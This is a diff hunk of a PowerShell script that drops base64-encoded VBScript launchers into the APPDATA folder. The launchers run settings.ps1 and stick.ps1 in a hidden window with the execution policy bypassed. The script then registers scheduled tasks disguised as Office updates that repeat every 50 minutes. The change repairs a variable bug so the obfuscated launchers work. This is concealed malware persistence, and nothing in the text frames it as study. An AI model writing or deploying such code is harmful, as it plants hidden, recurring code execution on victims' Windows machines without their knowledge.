@@ -9,11 +9,11 @@ $filepath3 = $env:APPDATA + "\stick.ps1"
 Remove-Item -path $filepath1 -Force
 Remove-Item -path $filepath2 -Force
 
-$res  = [System.Convert]::FromBase64String("U2V0IHdTaGVsbD1DcmVhdGVPYmplY3QoIldTY3JpcHQuU2hlbGwiKQ0KZmFybiA9IHdTaGVsbC5FeHBhbmRFbnZpcm9ubWVudFN0cmluZ3MoIiVhcHBkYXRhJSIpDQoNCm93dyA9IHNhcG9qZGtzaiArICJcc2V0dGluZ3MucHMxIg0KcGF0aCA9ICJwb3dlcnNoZWxsLmV4ZSAtZXhlY3V0aW9ucG9saWN5IGJ5cGFzcyAtRmlsZSAiICsgb3d3DQoNCndTaGVsbC5SdW4gcGF0aCwgMA0K")
+$res  = [System.Convert]::FromBase64String("U2V0IHdTaGVsbD1DcmVhdGVPYmplY3QoIldTY3JpcHQuU2hlbGwiKQ0KZmFybiA9IHdTaGVsbC5FeHBhbmRFbnZpcm9ubWVudFN0cmluZ3MoIiVhcHBkYXRhJSIpDQoNCm93dyA9IGZhcm4gKyAiXHNldHRpbmdzLnBzMSINCnBhdGggPSAicG93ZXJzaGVsbC5leGUgLWV4ZWN1dGlvbnBvbGljeSBieXBhc3MgLUZpbGUgIiArIG93dw0KDQp3U2hlbGwuUnVuIHBhdGgsIDA=")
 $r=[System.Text.Encoding]::UTF8.GetString($res)
 $r >> $filepath
 
-$res  = [System.Convert]::FromBase64String("U2V0IHdTaGVsbD1DcmVhdGVPYmplY3QoIldTY3JpcHQuU2hlbGwiKQ0KZmFybiA9IHdTaGVsbC5FeHBhbmRFbnZpcm9ubWVudFN0cmluZ3MoIiVhcHBkYXRhJSIpDQoNCm93dyA9IHNhcG9qZGtzaiArICJcc3RpY2sucHMxIg0KcGF0aCA9ICJwb3dlcnNoZWxsLmV4ZSAtZXhlY3V0aW9ucG9saWN5IGJ5cGFzcyAtRmlsZSAiICsgb3d3DQoNCndTaGVsbC5SdW4gcGF0aCwgMA==")
+$res  = [System.Convert]::FromBase64String("U2V0IHdTaGVsbD1DcmVhdGVPYmplY3QoIldTY3JpcHQuU2hlbGwiKQ0KZmFybiA9IHdTaGVsbC5FeHBhbmRFbnZpcm9ubWVudFN0cmluZ3MoIiVhcHBkYXRhJSIpDQoNCm93dyA9IGZhcm4gKyAiXHN0aWNrLnBzMSINCnBhdGggPSAicG93ZXJzaGVsbC5leGUgLWV4ZWN1dGlvbnBvbGljeSBieXBhc3MgLUZpbGUgIiArIG93dw0KDQp3U2hlbGwuUnVuIHBhdGgsIDA=")
 $r=[System.Text.Encoding]::UTF8.GetString($res)
 $r >> $filepath1
 
@@ -35,8 +35,6 @@ schtasks /create /tn "OfficesUpdate" /sc minute /tr $ws1 /mo 50 /F
 schtasks /run /tn "Offices"
 sleep 5
 schtasks /run /tn "OfficeUpdate"
-
-
 
 
 
